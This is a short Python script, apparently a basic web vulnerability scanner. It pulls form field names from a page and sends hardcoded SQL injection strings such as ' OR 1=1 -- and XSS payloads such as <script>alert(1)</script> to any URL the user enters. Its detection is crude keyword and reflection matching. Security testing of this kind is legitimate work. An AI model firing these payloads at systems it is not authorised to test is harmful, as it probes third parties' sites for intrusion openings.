import requests
from bs4 import BeautifulSoup

# Simple SQL Injection payloads
sql_injection_payloads = ["' OR 1=1 --", '" OR "a"="a', "' OR 1=1#", "' AND 1=1; --"]

# Simple XSS payloads
xss_payloads = ['<script>alert(1)</script>', '<img src="x" onerror="alert(1)">', '<svg/onload=alert(1)>']

# Function to check SQL Injection vulnerability
def check_sql_injection(url, params):
    for param in params:
        for payload in sql_injection_payloads:
            modified_url = url + f"?{param}={payload}"
            response = requests.get(modified_url)
            if "error" in response.text.lower() or "warning" in response.text.lower():
                print(f"[!] Possible SQL Injection vulnerability detected at {modified_url}")
                return True
    return False

# Function to check XSS vulnerability
def check_xss(url, params):
    for param in params:
        for payload in xss_payloads:
            modified_url = url + f"?{param}={payload}"
            response = requests.get(modified_url)
            if payload in response.text:
                print(f"[!] Possible XSS vulnerability detected at {modified_url}")
                return True
    return False

# Function to scan the website for vulnerabilities
def scan_url(url):
    print(f"[+] Scanning {url}...")

    try:
        response = requests.get(url)
        if response.status_code != 200:
            print(f"[!] Error: Failed to fetch page (Status code: {response.status_code})")
            return
    except requests.exceptions.RequestException as e:
        print(f"[!] Error: {e}")
        return

    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Extract parameters from forms and links
    forms = soup.find_all('form')
    params = set()

    for form in forms:
        for input_tag in form.find_all('input'):
            name = input_tag.get('name')
            if name:
                params.add(name)

    # Check for vulnerabilities
    sql_injection_found = check_sql_injection(url, params)
    xss_found = check_xss(url, params)

    if not sql_injection_found and not xss_found:
        print("[+] No vulnerabilities found.")
    else:
        print("[+] Scan complete.")

# Main function to start the scanner
if __name__ == "__main__":
    target_url = input("[*] Enter the URL to scan: ").strip()
    
    if not target_url.startswith("http"):
        print("[!] Please provide a valid URL starting with http:// or https://")
    else:
        scan_url(target_url)


